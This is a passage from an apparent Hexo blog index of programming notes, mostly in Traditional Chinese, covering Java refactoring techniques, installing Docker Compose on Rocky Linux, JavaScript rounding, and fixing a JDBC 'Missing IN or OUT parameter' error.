<p>void printDetails(double outstanding) {<br>  System.out.println(“name: “ + name);<br>  System.out.println(“amount: “ + outstanding);<br>}</p>
<h2 id="Why-Refactor"><a href="#Why-Refactor" class="headerlink" title="Why Refactor:"></a>Why Refactor:</h2><p>The more lines found in a method, the harder it’s to figure out what the method does. This is the main reason for this refactoring.</p>
<p>Besides eliminating rough edges in your code, extracting methods is also a step in many other refactoring approaches.</p>
<h2 id="Benefits"><a href="#Benefits" class="headerlink" title="Benefits:"></a>Benefits:</h2><p>More readable code! Be sure to give the new method a name that describes the method’s purpose: createOrder(), renderCustomerInfo(), etc.</p>
<p>Less code duplication. Often the code that’s found in a method can be reused in other places in your program. So you can replace duplicates with calls to your new method.</p>
<p>Isolates independent parts of code, meaning that errors are less likely (such as if the wrong variable is modified).</p>
<h2 id="How-to-Refactor"><a href="#How-to-Refactor" class="headerlink" title="How to Refactor:"></a>How to Refactor:</h2><p>Create a new method and name it in a way that makes its purpose self-evident.</p>
<p>Copy the relevant code fragment to your new method. Delete the fragment from its old location and put a call for the new method there instead.</p>
<p>Find all variables used in this code fragment. If they’re declared inside the fragment and not used outside of it,<br>simply leave them unchanged—they’ll become local variables for the new method.</p>
<p>If the variables are declared prior to the code that you’re extracting, you will need to pass these variables to the parameters of your new method<br>in order to use the values previously contained in them. Sometimes it’s easier to get rid of these variables by resorting to Replace Temp with Query.</p>
<p>If you see that a local variable changes in your extracted code in some way, this may mean that this changed value will be needed later in your main method.<br>Double-check! And if this is indeed the case, return the value of this variable to the main method to keep everything functioning.</p>
]]></content>
      <categories>
        <category>Refactor</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Refactor ComposingMethods Replace Temp with Query</title>
    <url>/posts/8d1e6725/</url>
    <content><![CDATA[<h3 id="Refactor-ComposingMethods-Replace-Temp-with-Query"><a href="#Refactor-ComposingMethods-Replace-Temp-with-Query" class="headerlink" title="Refactor-ComposingMethods:Replace Temp with Query"></a>Refactor-ComposingMethods:Replace Temp with Query</h3><span id="more"></span>
<p>在重構的Composing methods中，有許多重構方法。這篇將介紹Replace Temp with Query的使用方法。</p>
<h3 id="Problem-amp-Solution"><a href="#Problem-amp-Solution" class="headerlink" title="Problem &amp; Solution"></a>Problem &amp; Solution</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Problem:You place the result of an expression <span class="keyword">in</span> a <span class="built_in">local</span> variable <span class="keyword">for</span> later use <span class="keyword">in</span> your code.</span><br><span class="line">Solution:Move the entire expression to a separate method and <span class="built_in">return</span> the result from it. </span><br><span class="line">Query the method instead of using a variable. Incorporate the new method <span class="keyword">in</span> other methods, <span class="keyword">if</span> necessary.</span><br></pre></td></tr></table></figure>

<h3 id="Example-by-Java-before-Rafactor"><a href="#Example-by-Java-before-Rafactor" class="headerlink" title="Example by Java before Rafactor"></a>Example by Java before Rafactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">double <span class="function"><span class="title">calculateTotal</span></span>() &#123;</span><br><span class="line">  double basePrice = quantity * itemPrice;</span><br><span class="line">  <span class="keyword">if</span> (basePrice &gt; 1000) &#123;</span><br><span class="line">    <span class="built_in">return</span> basePrice * 0.95;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">return</span> basePrice * 0.98;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Example-by-Java-after-Rafactor"><a href="#Example-by-Java-after-Rafactor" class="headerlink" title="Example by Java after Rafactor"></a>Example by Java after Rafactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">double <span class="function"><span class="title">calculateTotal</span></span>() &#123;</span><br><span class="line">  <span class="keyword">if</span> (basePrice() &gt; 1000) &#123;</span><br><span class="line">    <span class="built_in">return</span> basePrice() * 0.95;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">return</span> basePrice() * 0.98;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">double <span class="function"><span class="title">basePrice</span></span>() &#123;</span><br><span class="line">  <span class="built_in">return</span> quantity * itemPrice;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Why-Refactor"><a href="#Why-Refactor" class="headerlink" title="Why Refactor"></a>Why Refactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">This refactoring can lay the groundwork <span class="keyword">for</span> applying Extract Method <span class="keyword">for</span> a portion of a very long method.</span><br><span class="line"></span><br><span class="line">The same expression may sometimes be found <span class="keyword">in</span> other methods as well, <span class="built_in">which</span> is one reason to consider creating a common method.</span><br></pre></td></tr></table></figure>

<h3 id="Benefits"><a href="#Benefits" class="headerlink" title="Benefits"></a>Benefits</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Code readability. It’s much easier to understand the purpose of the method getTax() than the line orderPrice() * 0.2.</span><br><span class="line"></span><br><span class="line">Slimmer code via deduplication, <span class="keyword">if</span> the line being replaced is used <span class="keyword">in</span> multiple methods.</span><br></pre></td></tr></table></figure>

<h3 id="Good-to-Know"><a href="#Good-to-Know" class="headerlink" title="Good to Know"></a>Good to Know</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Performance</span><br><span class="line">This refactoring may prompt the question of whether this approach is liable to cause a performance hit. </span><br><span class="line">The honest answer is: <span class="built_in">yes</span>, it’s, since the resulting code may be burdened by querying a new method. </span><br><span class="line">But with today’s fast CPUs and excellent compilers, the burden will almost always be minimal.</span><br><span class="line">By contrast, readable code and the ability to reuse this method <span class="keyword">in</span> other places <span class="keyword">in</span> program code—thanks </span><br><span class="line">to this refactoring approach—are very noticeable benefits.</span><br><span class="line"></span><br><span class="line">Nonetheless, <span class="keyword">if</span> your temp variable is used to cache the result of a truly time-consuming expression, </span><br><span class="line">you may want to stop this refactoring after extracting the expression to a new method.</span><br></pre></td></tr></table></figure>

<h3 id="How-to-Refactor"><a href="#How-to-Refactor" class="headerlink" title="How to Refactor"></a>How to Refactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Make sure that a value is assigned to the variable once and only once within the method. </span><br><span class="line">If not, use Split Temporary Variable to ensure that the variable will be used only to store the result of your expression.</span><br><span class="line"></span><br><span class="line">Use Extract Method to place the expression of interest <span class="keyword">in</span> a new method. </span><br><span class="line">Make sure that this method only returns a value and doesn’t change the state of the object. </span><br><span class="line">If the method affects the visible state of the object, use Separate Query from Modifier.</span><br><span class="line"></span><br><span class="line">Replace the variable with a query to your new method.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Refactor</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Refactor ComposingMethods Split Temporary Variable</title>
    <url>/posts/948797c2/</url>
    <content><![CDATA[<h3 id="Refactor-ComposingMethods-Split-Temporary-Variable"><a href="#Refactor-ComposingMethods-Split-Temporary-Variable" class="headerlink" title="Refactor-ComposingMethods:Split Temporary Variable"></a>Refactor-ComposingMethods:Split Temporary Variable</h3><span id="more"></span>
<p>在重構的Composing methods中，有許多重構方法。這篇將介紹Split Temporary Variable的使用方法。</p>
<h3 id="Problem-amp-Solution"><a href="#Problem-amp-Solution" class="headerlink" title="Problem &amp; Solution"></a>Problem &amp; Solution</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Problem:You have a <span class="built_in">local</span> variable that’s used to store various intermediate values inside a method (except <span class="keyword">for</span> cycle variables).</span><br><span class="line">Solution:Use different variables <span class="keyword">for</span> different values. Each variable should be responsible <span class="keyword">for</span> only one particular thing.</span><br></pre></td></tr></table></figure>

<h3 id="Example-by-Java-before-Rafactor"><a href="#Example-by-Java-before-Rafactor" class="headerlink" title="Example by Java before Rafactor"></a>Example by Java before Rafactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">double temp = 2 * (height + width);</span><br><span class="line">System.out.println(temp);</span><br><span class="line">temp = height * width;</span><br><span class="line">System.out.println(temp);</span><br></pre></td></tr></table></figure>

<h3 id="Example-by-Java-after-Rafactor"><a href="#Example-by-Java-after-Rafactor" class="headerlink" title="Example by Java after Rafactor"></a>Example by Java after Rafactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">final double perimeter = 2 * (height + width);</span><br><span class="line">System.out.println(perimeter);</span><br><span class="line">final double area = height * width;</span><br><span class="line">System.out.println(area);</span><br></pre></td></tr></table></figure>

<h3 id="Why-Refactor"><a href="#Why-Refactor" class="headerlink" title="Why Refactor"></a>Why Refactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">If you’re skimping on the number of variables inside a <span class="keyword">function</span> and reusing them <span class="keyword">for</span> various unrelated purposes, </span><br><span class="line">you’re sure to encounter problems as soon as you need to make changes to the code containing the variables. </span><br><span class="line">You will have to recheck each <span class="keyword">case</span> of variable use to make sure that the correct values are used.</span><br></pre></td></tr></table></figure>

<h3 id="Benefits"><a href="#Benefits" class="headerlink" title="Benefits"></a>Benefits</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Each component of the program code should be responsible <span class="keyword">for</span> one and one thing only. </span><br><span class="line">This makes it much easier to maintain the code, since you can easily replace any particular thing without fear of unintended effects.</span><br><span class="line"></span><br><span class="line">Code becomes more readable. If a variable was created long ago <span class="keyword">in</span> a rush, </span><br><span class="line">it probably has a name that doesn’t explain anything: k, a2, value, etc. </span><br><span class="line">But you can fix this situation by naming the new variables <span class="keyword">in</span> an understandable, self-explanatory way. </span><br><span class="line">Such names might resemble customerTaxValue, cityUnemploymentRate, clientSalutationString and the like.</span><br><span class="line"></span><br><span class="line">This refactoring technique is useful <span class="keyword">if</span> you anticipate using Extract Method later.</span><br></pre></td></tr></table></figure>

<h3 id="How-to-Refactor"><a href="#How-to-Refactor" class="headerlink" title="How to Refactor"></a>How to Refactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Find the first place <span class="keyword">in</span> the code <span class="built_in">where</span> the variable is given a value. </span><br><span class="line">Here you should rename the variable with a name that corresponds to the value being assigned.</span><br><span class="line"></span><br><span class="line">Use the new name instead of the old one <span class="keyword">in</span> places <span class="built_in">where</span> this value of the variable is used.</span><br><span class="line"></span><br><span class="line">Repeat as needed <span class="keyword">for</span> places <span class="built_in">where</span> the variable is assigned a different value.</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Refactor</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Refactor ComposingMethods inlineMethod</title>
    <url>/posts/64ce43fd/</url>
    <content><![CDATA[<h3 id="Refactor-ComposingMethods-inlineMethod"><a href="#Refactor-ComposingMethods-inlineMethod" class="headerlink" title="Refactor-ComposingMethods:inlineMethod"></a>Refactor-ComposingMethods:inlineMethod</h3><span id="more"></span>
<p>在重構的Composing methods中，有許多重構方法。這篇將介紹inline Method的使用方法。</p>
<h3 id="Problem-amp-Solution"><a href="#Problem-amp-Solution" class="headerlink" title="Problem &amp; Solution"></a>Problem &amp; Solution</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Problem:When a method body is more obvious than the method itself, use this technique.</span><br><span class="line">Solution:Replace calls to the method with the method’s content and delete the method itself.</span><br></pre></td></tr></table></figure>

<h3 id="Example-by-Java-before-Rafactor"><a href="#Example-by-Java-before-Rafactor" class="headerlink" title="Example by Java before Rafactor"></a>Example by Java before Rafactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">class PizzaDelivery &#123;</span><br><span class="line">  // ...</span><br><span class="line">  int <span class="function"><span class="title">getRating</span></span>() &#123;</span><br><span class="line">    <span class="built_in">return</span> moreThanFiveLateDeliveries() ? 2 : 1;</span><br><span class="line">  &#125;</span><br><span class="line">  boolean <span class="function"><span class="title">moreThanFiveLateDeliveries</span></span>() &#123;</span><br><span class="line">    <span class="built_in">return</span> numberOfLateDeliveries &gt; 5;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Example-by-Java-after-Rafactor"><a href="#Example-by-Java-after-Rafactor" class="headerlink" title="Example by Java after Rafactor"></a>Example by Java after Rafactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">class PizzaDelivery &#123;</span><br><span class="line">  // ...</span><br><span class="line">  int <span class="function"><span class="title">getRating</span></span>() &#123;</span><br><span class="line">    <span class="built_in">return</span> numberOfLateDeliveries &gt; 5 ? 2 : 1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Why-Refactor"><a href="#Why-Refactor" class="headerlink" title="Why Refactor"></a>Why Refactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">A method simply delegates to another method. In itself, this delegation is no problem. </span><br><span class="line">But when there are many such methods, they become a confusing tangle that’s hard to <span class="built_in">sort</span> through.</span><br><span class="line"></span><br><span class="line">Often methods aren’t too short originally, but become that way as changes are made to the program. </span><br><span class="line">So don’t be shy about getting rid of methods that have outlived their use.</span><br></pre></td></tr></table></figure>

<h3 id="Benefits"><a href="#Benefits" class="headerlink" title="Benefits"></a>Benefits</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">By minimizing the number of unneeded methods, you make the code more straightforward.</span><br></pre></td></tr></table></figure>

<h3 id="How-to-Refactor"><a href="#How-to-Refactor" class="headerlink" title="How to Refactor"></a>How to Refactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Make sure that the method isn’t redefined <span class="keyword">in</span> subclasses. If the method is redefined, refrain from this technique.</span><br><span class="line"></span><br><span class="line">Find all calls to the method. Replace these calls with the content of the method.</span><br><span class="line"></span><br><span class="line">Delete the method.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Refactor</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Refactor ComposingMethods ExtractVariable</title>
    <url>/posts/a2db89c3/</url>
    <content><![CDATA[<h2 id="Refactor-ComposingMethods-ExtractVariable"><a href="#Refactor-ComposingMethods-ExtractVariable" class="headerlink" title="Refactor-ComposingMethods:ExtractVariable"></a>Refactor-ComposingMethods:ExtractVariable</h2><span id="more"></span>
<p>在重構的Composing methods中，有許多重構方法。這篇將介紹Extract Variable的使用方法。</p>
<h2 id="Problem-amp-Solution"><a href="#Problem-amp-Solution" class="headerlink" title="Problem &amp; Solution:"></a>Problem &amp; Solution:</h2><p>Problem:You have an expression that’s hard to understand.<br>Solution:Place the result of the expression or its parts in separate variables that are self-explanatory.</p>
<h2 id="Example-by-Java-before-Rafactor"><a href="#Example-by-Java-before-Rafactor" class="headerlink" title="Example by Java before Rafactor:"></a>Example by Java before Rafactor:</h2><p>void renderBanner() {<br>  if ((platform.toUpperCase().indexOf(“MAC”) &gt; -1) &amp;&amp;<br>       (browser.toUpperCase().indexOf(“IE”) &gt; -1) &amp;&amp;<br>        wasInitialized() &amp;&amp; resize &gt; 0 )<br>  {<br>    &#x2F;&#x2F; do something<br>  }<br>}</p>
<h2 id="Example-by-Java-after-Rafactor"><a href="#Example-by-Java-after-Rafactor" class="headerlink" title="Example by Java after Rafactor:"></a>Example by Java after Rafactor:</h2><p>void renderBanner() {<br>  final boolean isMacOs &#x3D; platform.toUpperCase().indexOf(“MAC”) &gt; -1;<br>  final boolean isIE &#x3D; browser.toUpperCase().indexOf(“IE”) &gt; -1;<br>  final boolean wasResized &#x3D; resize &gt; 0;</p>
<p>  if (isMacOs &amp;&amp; isIE &amp;&amp; wasInitialized() &amp;&amp; wasResized) {<br>    &#x2F;&#x2F; do something<br>  }<br>}</p>
<h2 id="Why-Refactor"><a href="#Why-Refactor" class="headerlink" title="Why Refactor:"></a>Why Refactor:</h2><p>The main reason for extracting variables is to make a complex expression more understandable, by dividing it into its intermediate parts.<br>These could be:Condition of the if() operator or a part of the ?: operator in C-based languages</p>
<p>A long arithmetic expression without intermediate results<br>Long multipart lines<br>Extracting a variable may be the first step towards performing Extract Method if you see that the extracted expression is used in other places in your code.</p>
<h2 id="Benefits"><a href="#Benefits" class="headerlink" title="Benefits:"></a>Benefits:</h2><p>More readable code! Try to give the extracted variables good names that announce the variable’s purpose loud and clear.<br>More readability, fewer long-winded comments. Go for names like customerTaxValue, cityUnemploymentRate, clientSalutationString, etc.</p>
<h2 id="Drawbacks"><a href="#Drawbacks" class="headerlink" title="Drawbacks:"></a>Drawbacks:</h2><p>More variables are present in your code. But this is counterbalanced by the ease of reading your code.</p>
<p>When refactoring conditional expressions, remember that the compiler will most likely optimize it to minimize the amount of calculations<br>needed to establish the resulting value. Say you have a following expression if (a() || b()) …. The program won’t call the method b<br>if the method a returns true because the resulting value will still be true, no matter what value returns b.</p>
<p>However, if you extract parts of this expression into variables, both methods will always be called,<br>which might hurt performance of the program, especially if these methods do some heavyweight work.</p>
<h2 id="How-to-Refactor"><a href="#How-to-Refactor" class="headerlink" title="How to Refactor:"></a>How to Refactor:</h2><p>Insert a new line before the relevant expression and declare a new variable there. Assign part of the complex expression to this variable.</p>
<p>Replace that part of the expression with the new variable.</p>
<p>Repeat the process for all complex parts of the expression.</p>
]]></content>
      <categories>
        <category>Refactor</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Rocky Install Docker Compose</title>
    <url>/posts/ca2460ef/</url>
    <content><![CDATA[<h3 id="Intro-Rocky-Install-Docker-Compose"><a href="#Intro-Rocky-Install-Docker-Compose" class="headerlink" title="Intro Rocky Install Docker Compose"></a>Intro Rocky Install Docker Compose</h3><span id="more"></span>
<p>這篇介紹Rocky Install Docker Compose。</p>
<h3 id="安裝過程"><a href="#安裝過程" class="headerlink" title="安裝過程"></a>安裝過程</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/local/bin</span><br><span class="line">$ curl -L <span class="string">&quot;https://github.com/docker/compose/releases/latest/download/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br><span class="line">$ <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">$ docker-compose -v</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Rocky8</tag>
        <tag>DockerCompose</tag>
      </tags>
  </entry>
  <entry>
    <title>Refactor ComposingMethods inlineTemp</title>
    <url>/posts/21165d7c/</url>
    <content><![CDATA[<h3 id="Refactor-ComposingMethods-inlineTemp"><a href="#Refactor-ComposingMethods-inlineTemp" class="headerlink" title="Refactor-ComposingMethods:inlineTemp"></a>Refactor-ComposingMethods:inlineTemp</h3><span id="more"></span>
<p>在重構的Composing methods中，有許多重構方法。這篇將介紹inline Temp的使用方法。</p>
<h3 id="Problem-amp-Solution"><a href="#Problem-amp-Solution" class="headerlink" title="Problem &amp; Solution"></a>Problem &amp; Solution</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Problem:You have a temporary variable that’s assigned the result of a simple expression and nothing more.</span><br><span class="line">Solution:Replace the references to the variable with the expression itself.</span><br></pre></td></tr></table></figure>

<h3 id="Example-by-Java-before-Rafactor"><a href="#Example-by-Java-before-Rafactor" class="headerlink" title="Example by Java before Rafactor"></a>Example by Java before Rafactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">boolean hasDiscount(Order order) &#123;</span><br><span class="line">  double basePrice = order.basePrice();</span><br><span class="line">  <span class="built_in">return</span> basePrice &gt; 1000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Example-by-Java-after-Rafactor"><a href="#Example-by-Java-after-Rafactor" class="headerlink" title="Example by Java after Rafactor"></a>Example by Java after Rafactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">boolean hasDiscount(Order order) &#123;</span><br><span class="line">  <span class="built_in">return</span> order.basePrice() &gt; 1000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Why-Refactor"><a href="#Why-Refactor" class="headerlink" title="Why Refactor"></a>Why Refactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Inline <span class="built_in">local</span> variables are almost always used as part of Replace Temp with Query or to pave the way <span class="keyword">for</span> Extract Method.</span><br></pre></td></tr></table></figure>

<h3 id="Benefits"><a href="#Benefits" class="headerlink" title="Benefits"></a>Benefits</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">This refactoring technique offers almost no benefit <span class="keyword">in</span> and of itself. However, <span class="keyword">if</span> the variable is assigned the result of a method,</span><br><span class="line">you can marginally improve the readability of the program by getting rid of the unnecessary variable.</span><br></pre></td></tr></table></figure>

<h3 id="Drawbacks"><a href="#Drawbacks" class="headerlink" title="Drawbacks"></a>Drawbacks</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Sometimes seemingly useless temps are used to cache the result of an expensive operation that’s reused several <span class="built_in">times</span>. </span><br><span class="line">So before using this refactoring technique, make sure that simplicity won’t come at the cost of performance.</span><br></pre></td></tr></table></figure>

<h3 id="How-to-Refactor"><a href="#How-to-Refactor" class="headerlink" title="How to Refactor"></a>How to Refactor</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Find all places that use the variable. Instead of the variable, use the expression that had been assigned to it.</span><br><span class="line"></span><br><span class="line">Delete the declaration of the variable and its assignment line.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Refactor</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Round For JavaScript</title>
    <url>/posts/b354929e/</url>
    <content><![CDATA[<h3 id="Round-For-JavaScript"><a href="#Round-For-JavaScript" class="headerlink" title="Round For JavaScript"></a>Round For JavaScript</h3><span id="more"></span>
<p>這篇介紹在JavaScript對數字做四捨五入到小數第二位需要注意事項。</p>
<h3 id="錯誤case"><a href="#錯誤case" class="headerlink" title="錯誤case"></a>錯誤case</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Math.round(127.825 * 100)/100 ----&gt; 127.83 (O)</span><br><span class="line">Math.round(128.825 * 100)/100 ----&gt; 128.82 (X)</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">const roundFormat = <span class="keyword">function</span> (value, arg) &#123;</span><br><span class="line">	var fixed = arg || 0;</span><br><span class="line">	isNaN(parseFloat(value)) ? value = 0 : value = parseFloat(value);</span><br><span class="line">	<span class="keyword">if</span> (fixed &gt; 0) &#123;</span><br><span class="line">		var size = Math.pow(10, fixed);</span><br><span class="line">		value = Math.round(value + <span class="string">&quot;e&quot;</span> + fixed) / size;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">roundFormat(127.825, 2);  ------&gt; 127.83 (O)</span><br><span class="line">roundFormat(128.825, 2);  ------&gt; 128.83 (O)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>How to solve java sql SQLException: Missing IN or OUT parameter at index:: 1</title>
    <url>/posts/9532beda/</url>
    <content><![CDATA[<h3 id="How-to-solve-java-sql-SQLException-Missing-IN-or-OUT-parameter-at-index-1"><a href="#How-to-solve-java-sql-SQLException-Missing-IN-or-OUT-parameter-at-index-1" class="headerlink" title="How to solve java sql SQLException: Missing IN or OUT parameter at index:: 1"></a>How to solve java sql SQLException: Missing IN or OUT parameter at index:: 1</h3><span id="more"></span>
<p>這篇介紹How to solve java sql SQLException: Missing IN or OUT parameter at index:: 1</p>
<h3 id="發生錯誤的case"><a href="#發生錯誤的case" class="headerlink" title="發生錯誤的case"></a>發生錯誤的case</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">try (Connection conn = DBPool.getReadConnection();</span><br><span class="line">	PreparedStatement stmt = conn.prepareStatement(sql);</span><br><span class="line">	ResultSet rs = stmt.executeQuery();) &#123;</span><br><span class="line">	stmt.setString(1, <span class="string">&quot;server1&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">		String userId = rs.getString(<span class="string">&quot;userid&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (userId == null) &#123;</span><br><span class="line">			<span class="built_in">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		//do something</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">當PreparedStatement設定參數在PreparedStatement的executeQuery方法之後，</span><br><span class="line">就會throw java.sql.SQLException: Missing IN or OUT parameter at index:: 1</span><br><span class="line">原因是sql的<span class="built_in">where</span>條件找不到對應的值。</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">try (Connection conn = DBPool.getReadConnection();</span><br><span class="line">	PreparedStatement stmt = conn.prepareStatement(sql)) &#123;</span><br><span class="line">	stmt.setString(1, <span class="string">&quot;server1&quot;</span>);</span><br><span class="line">	try (ResultSet rs = stmt.executeQuery()) &#123;</span><br><span class="line">		<span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">			String userId = rs.getString(<span class="string">&quot;userid&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span> (userId == null) &#123;</span><br><span class="line">				<span class="built_in">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			//do something</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">將PreparedStatement設定參數移到PreparedStatement的executeQuery方法之前，</span><br><span class="line">即可解決。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Refactor重點</title>
    <url>/posts/2c9fab24/</url>
    <content><![CDATA[<h3 id="Refactor重點"><a href="#Refactor重點" class="headerlink" title="Refactor重點"></a>Refactor重點</h3><span id="more"></span>
<p>以下列出需要針對code再造的項目，以這幾個大原則為主。</p>
<h3 id="Refactor-points"><a href="#Refactor-points" class="headerlink" title="Refactor points"></a>Refactor points</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.減少對資料庫操作，能只查一次就查一次，盡量不要在迴圈内進行查詢。</span><br><span class="line">2.針對時間複雜度O(n^2)的部分，盡量簡化成O(n)。對於O(n+n)的部分以讓程式易讀好維護為主，</span><br><span class="line">可以不用節省成O(n)。</span><br><span class="line">3.Request和Response盡量用物件方式來接收，減少使用Map物件來節省記憶體跟方便操作為主。</span><br><span class="line">4.單層Map&lt;T,T&gt;會比多層Map&lt;T,Map&lt;T,T&gt;&gt;佳，請盡量使用MuitlKey當作單層Map的Key。</span><br><span class="line">5.Map可先在主程式最上層new HashMap，並傳入BO和DAO做put可達到一個Map可重複利用。</span><br></pre></td></tr></table></figure>

<h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.減少資料庫IO為主要目標</span><br><span class="line">2.少用Collections容器，多用基礎型別</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Refactor</tag>
      </tags>
  </entry>
  <entry>
    <title>How to solve 因為這個系統上已停用指令碼執行，所以無法載入…</title>
    <url>/posts/6ea8b647/</url>
    <content><![CDATA[<h3 id="How-to-solve-因為這個系統上已停用指令碼執行，所以無法載入…"><a href="#How-to-solve-因為這個系統上已停用指令碼執行，所以無法載入…" class="headerlink" title="How to solve 因為這個系統上已停用指令碼執行，所以無法載入…"></a>How to solve 因為這個系統上已停用指令碼執行，所以無法載入…</h3><span id="more"></span>
<p>這篇介紹How to solve 因為這個系統上已停用指令碼執行，所以無法載入…。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在VisualStudioCode terminal 執行 eslint --init指令時，</span><br><span class="line">出現</span><br><span class="line">eslint : 因為這個系統上已停用指令碼執行，所以無法載入 C:\Users\xxx\AppData\Roaming\npm\eslint.ps1 檔案。</span><br><span class="line">如需詳細資訊，請參閱 about_Execution_Policies，網址為 https:/go.microsoft.com/fwlink/?LinkID=135 </span><br><span class="line">170。</span><br><span class="line">位於 線路:1 字元:1</span><br><span class="line">+ eslint --init</span><br><span class="line">+ ~~~~~~</span><br><span class="line">    + CategoryInfo          : SecurityError: (:) [], PSSecurityException</span><br><span class="line">    + FullyQualifiedErrorId : UnauthorizedAccess</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

